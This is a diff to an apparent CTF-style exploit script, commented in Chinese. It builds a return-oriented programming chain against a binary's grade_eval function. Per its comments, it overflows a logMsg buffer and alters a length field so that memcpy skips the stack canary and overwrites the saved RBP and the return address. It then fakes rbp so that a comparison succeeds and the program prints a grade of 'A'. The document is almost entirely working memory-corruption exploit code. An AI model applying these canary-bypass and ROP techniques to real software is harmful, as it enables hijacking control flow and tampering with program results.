@@ -8,24 +8,24 @@ def q(x):
     return x.to_bytes(8, "little")
 
 
-PRINTF_GOT = 0x602028  # printf的GOT项，间接调用时从这里取printf地址
-FORMAT = 0x4018c8      # grade_eval用的格式串
 POP6 = 0x40189a        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
 RET = 0x4018a4         # ret，用于栈对齐
-MOV_CALL = 0x401880    # mov r13d,edi; call *[r12+rbx*8]
+GRADE_CHK = 0x401691   # grade_eval+0x1a: cmpl $4,-0x14(%rbp); ...; call printf@plt; ...; call fflush(stdout)
+FOUR = 0x400044        # 只读段里值为4的dword（PT_PHDR的p_flags=PF_R），供cmpl比较
 
 # 前128字节放在expression里，会被memcpy搬到saved RBP/返回地址处
-# 依次是假saved RBP、POP6、六个pop值（rbx=0、rbp=1、r12=printf@got、r13=格式串、r14='A'、r15=0）、RET、MOV_CALL
+# 依次是假saved RBP、POP6、六个pop值、RET、跳进grade_eval内部
+# rbp设为FOUR+0x14，使[rbp-0x14]==4，grade_eval自己算出'A'并调用printf，随后fflush(stdout)
 chain = q(0x4242424242424242)
 chain += q(POP6)
 chain += q(0)
-chain += q(1)
-chain += q(PRINTF_GOT)
-chain += q(FORMAT)
-chain += q(0x41)
+chain += q(FOUR + 0x14)
+chain += q(0)
+chain += q(0)
+chain += q(0)
 chain += q(0)
 chain += q(RET)
-chain += q(MOV_CALL)
+chain += q(GRADE_CHK)
 chain += b"A" * (128 - len(chain))
 
 # 128字节填满logMsg，再把f.len改成0xa0，让memcpy跳过Canary直接写到saved RBP处
